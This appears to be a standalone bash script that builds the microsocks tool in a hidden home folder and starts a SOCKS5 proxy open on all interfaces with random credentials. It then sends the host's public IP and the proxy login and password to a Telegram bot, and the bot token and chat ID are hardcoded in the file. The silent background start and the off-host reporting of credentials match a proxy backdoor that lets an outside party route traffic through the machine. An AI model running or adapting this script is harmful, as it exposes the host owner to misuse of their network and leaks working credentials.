#!/bin/bash

set -e

BOT_TOKEN="8216672386:AAEnVSLmGOk7Yz1B_y6d3XXY7ffDdzpI0D0"
CHAT_ID="7736738893"

BASE="$HOME/.local/microsocks"
BIN="$BASE/microsocks"
PORT=1080

mkdir -p "$BASE"

if [ ! -x "$BIN" ]; then
    command -v git >/dev/null || {
        exit 1
    }

    command -v make >/dev/null || {
        exit 1
    }

    command -v gcc >/dev/null || {
        exit 1
    }

    rm -rf "$BASE/src"

    git clone --depth 1 \
        https://github.com/rofl0r/microsocks.git \
        "$BASE/src"

    make -C "$BASE/src"
    cp "$BASE/src/microsocks" "$BIN"
    chmod 700 "$BIN"
fi

USER=$(tr -dc 'a-zA-Z0-9' </dev/urandom | head -c 12)
PASS=$(tr -dc 'a-zA-Z0-9' </dev/urandom | head -c 24)

pkill -f "$BIN.*-p $PORT" 2>/dev/null || true

"$BIN" \
    -i 0.0.0.0 \
    -p "$PORT" \
    -u "$USER" \
    -P "$PASS" \
    >/tmp/microsocks.log 2>&1 &

PID=$!

sleep 1

if ! kill -0 "$PID" 2>/dev/null; then
    echo "Не удалось запустить SOCKS5."
    cat /tmp/microsocks.log
    exit 1
fi

IP=$(curl -fsS https://2ip.io 2>/dev/null)

PROXY="socks5://${USER}:${PASS}@${IP}:${PORT}"

curl -fsS \
    --socks5-hostname "127.0.0.1:${PORT}" \
    https://2ip.io >/dev/null

MESSAGE="SOCKS5 запущен

Login: ${USER}
Password: ${PASS}
Port: ${PORT}

Proxy:
${PROXY}"

curl -fsS -X POST \
    "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
    --data-urlencode "chat_id=${CHAT_ID}" \
    --data-urlencode "text=${MESSAGE}" \
    >/dev/null
